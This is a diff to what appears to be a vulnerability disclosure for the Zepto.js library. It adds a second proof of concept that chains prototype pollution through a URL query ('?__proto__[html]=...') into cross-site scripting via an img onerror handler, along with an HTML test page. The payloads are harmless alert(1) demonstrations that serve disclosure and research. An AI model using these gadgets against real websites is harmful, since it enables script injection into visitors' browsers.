@@ -18,6 +18,8 @@ https://github.com/madrobby/zepto/blob/763b3d6dc3b4350759ed30aa196cd2b6e39efcfb/
 
 ### PoC
 
+#### PoC #1
+
 ```
 ?__proto__[onerror]=alert(1)
 ```
@@ -29,5 +31,21 @@ https://github.com/madrobby/zepto/blob/763b3d6dc3b4350759ed30aa196cd2b6e39efcfb/
 </script>
 <script>
     $("<img/src>", {id: "x"})
+</script>
+```
+
+#### PoC #2
+
+```
+?__proto__[html]=<img/src/onerror%3dalert(1)>
+```
+
+```html
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.js"></script>
+<script>
+    Object.prototype.html="<img/src/onerror=alert(1)>"
+</script>
+<script>
+    $("<div>", {id: "x"})
 </script>
 ```
